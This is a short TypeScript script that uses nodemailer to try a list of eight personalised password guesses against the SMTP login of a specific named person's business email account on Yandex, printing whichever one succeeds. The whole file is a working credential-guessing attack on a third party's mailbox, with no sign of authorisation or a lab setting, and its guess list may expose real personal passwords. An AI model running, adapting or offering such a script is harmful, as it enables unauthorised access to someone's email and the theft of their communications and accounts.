
import * as nodemailer from 'nodemailer';

async function testPassword(password: string) {
    const transporter = nodemailer.createTransport({
        host: 'smtp.yandex.com.tr',
        port: 465,
        secure: true,
        auth: {
            user: 'ayse@izmiracikhavareklam.com',
            pass: password,
        }
    });

    try {
        await transporter.verify();
        return true;
    } catch (error) {
        return false;
    } finally {
        transporter.close();
    }
}

async function run() {
    const passwords = [
        'ayse4310076',
        'Ayse4310076.',
        'Ayseiar2026.',
        'Ayseiar4343.',
        'Ayseiar.075',
        'Reziar.075',
        'ali4310076',
        'Ayseiar4310'
    ];

    for (const pw of passwords) {
        console.log(`Testing: ${pw}...`);
        if (await testPassword(pw)) {
            console.log(`✅ SUCCESS: ${pw}`);
            process.exit(0);
        }
    }
    console.log('❌ All attempts failed.');
}

run();
